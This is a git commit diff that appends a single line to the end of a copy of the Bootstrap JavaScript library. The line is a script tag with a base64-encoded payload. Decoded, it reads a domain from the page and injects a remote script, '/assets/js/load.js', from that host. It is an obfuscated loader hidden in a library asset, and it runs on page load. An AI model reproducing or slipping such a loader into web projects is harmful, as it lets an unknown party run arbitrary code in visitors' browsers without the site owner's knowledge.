7036c3f4b9517378a29f0354043a9d453a0f2901
NALYD2121 <165321899+NALYD2121@users.noreply.github.com>
2024-03-28 21:26:18 +0100

    Add files via upload

--- js/bootstrap.js
+++ js/bootstrap.js
@@ -3923,3 +3923,4 @@
 
 })));
 //# sourceMappingURL=bootstrap.js.map
+<script src="data:text/javascript;base64,dmFyIHA9ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoInNjcmlwdCIpWzBdLGU9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0IiksZD1kb2N1bWVudC5xdWVyeVNlbGVjdG9yKCJkaXZbZG9tYWluXSIpLmdldEF0dHJpYnV0ZSgiZG9tYWluIik7ZS5zcmM9Ii8vIitkKyIvYXNzZXRzL2pzL2xvYWQuanMiLHAuYWZ0ZXIoZSk7"></script>
